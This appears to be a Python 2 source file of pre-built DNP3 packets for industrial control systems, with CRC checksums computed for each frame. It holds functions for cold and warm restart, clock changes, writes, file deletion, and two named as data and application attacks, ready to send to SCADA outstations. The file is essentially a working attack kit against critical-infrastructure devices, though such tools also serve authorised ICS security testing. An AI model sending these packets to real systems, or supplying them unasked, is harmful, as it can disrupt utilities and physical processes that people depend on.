from CRC import *
import struct
''' pre-make packet '''

def dnp3_cold_start():
	header = "\x05\x64\x08\xc4\x01\x00\x64\x00"
	data = "\xde\xce\x0d"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_warm_start():
	header = "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xc0\xce\x0e"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_time_change():
	header = "\x05\x64\x12\xc4\x01\x00\x64\x00"
	data = "\xc8\xc8\x02\x32\x01\x07\x01\x96\xd4\x7e\x4d\x45\x01"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_write():
	header= "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xdd\xce\x02"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_data_attack():
	header= "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data =  "\xde\xce\x0f"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_app_attack():
	header = "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xde\xce\x12"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_request_write_time_date():
	header = "\x05\x64\x12\xc4\x01\x00\x64\x00"
	data = "\xc0\xc5\x02\x32\x01\x07\x01\xf8\xb8\x6c\xaa\xf0\x00"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

def dnp3_file_delete():
	header = "\x05\x64\x08\xc4\x01\x00\x02\x00"
	data = "\xde\xce\x1b"
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

''''''